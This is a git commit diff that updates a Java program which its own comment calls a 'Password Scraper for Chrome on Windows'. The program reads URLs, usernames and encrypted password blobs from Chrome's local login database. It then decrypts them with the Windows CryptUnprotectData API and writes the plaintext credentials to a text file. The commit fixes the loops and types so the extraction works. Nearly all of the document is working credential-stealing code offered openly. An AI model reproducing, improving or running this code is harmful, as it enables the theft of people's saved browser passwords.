59c61a03b520eb69bdf8b4adc529cf7cc809c575
I2obiN <thomashood10@yahoo.com>
2016-09-18 03:26:02 +0100

    Update jdec.java

--- src/jdec.java
+++ src/jdec.java
@@ -10,6 +10,7 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.PrintStream;
+import java.io.UnsupportedEncodingException;
 import java.sql.DriverManager;
 import java.sql.Connection;
 import java.sql.ResultSet;
@@ -17,10 +18,11 @@ import java.sql.ResultSetMetaData;
 import java.sql.SQLException;
 import java.sql.Statement;
 
+// Password Scraper for Chrome on Windows
 
 public class jdec extends Crypt32Util {
 	
-	public static void main(String[] args) throws SQLException, FileNotFoundException{
+	public static void main(String[] args) throws SQLException, FileNotFoundException, UnsupportedEncodingException{
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
@@ -29,7 +31,7 @@ public class jdec extends Crypt32Util {
 		Connection conn = null;
 
 		// Use arguments string for db url
-		String url = "jdbc:sqlite:C:/your/path/logindata.db";
+		String url = "jdbc:sqlite:C:/Users/thoma/workspace/Crypt32Dec/src/logindata.db";
 		conn = DriverManager.getConnection(url);
 		
 		// SQL Queries
@@ -44,7 +46,7 @@ public class jdec extends Crypt32Util {
 		ResultSet dbcount = stmt4.executeQuery(count);
 		int cint = dbcount.getInt(1);
 		
-		byte bytearray[] = new byte[cint];
+		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
 		
 		ResultSet rsurls = stmt1.executeQuery(sqlurls);
 		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
@@ -54,35 +56,52 @@ public class jdec extends Crypt32Util {
 		int numberofsets = rsmeta.getColumnCount();
 		
 		// URLs into String array
-		int urint = 1;
+		int urint = 0;
 		String[] urls = new String[cint];
 		while(urint!=cint){
 			urls[urint] = rsurls.getString(1);
+			rsurls.next();
 			urint++;
 		}
 		
 		// Usernames into String array
-		int unint = 1;
+		int unint = 0;
 		String[] usernames = new String[cint];
 		while(unint!=cint){
 			usernames[unint] = rsusernames.getString(1);
+			rsusernames.next();
 			unint++;
 		}
 		
-		int pint = 1;
-		
+		int pint = 0;
 		// Putting BLOBs into byte array
 		while(pint!=cint){
-			bytearray[pint] = rspassblobs.getByte(1);
+			bytearray.add(rspassblobs.getBytes(1));
+			rspassblobs.next();
 			pint++;
 		}
 		
+		
+		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
+		int x = 0;
+		boolean work;
+		Object NULL = null;
+		
 		// Decrypt data
-		byte unencrypted[] = cryptUnprotectData(bytearray);
+		while(x != cint){
+		unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
+		x++;
+		}
+		
+		// Put decrypted passwords into string array
+		String[] passwords = new String[cint];
+		for(int y = 0; y < cint; y++){
+			passwords[y] = new String(unencrypted.get(y), "UTF-8");
+		}
 		
 		// Print results
 		for(int i = 0; i < cint; i++){
-			System.out.println(urls[i] + usernames[i] + unencrypted[i]);
+			System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
 		}
 
 	}
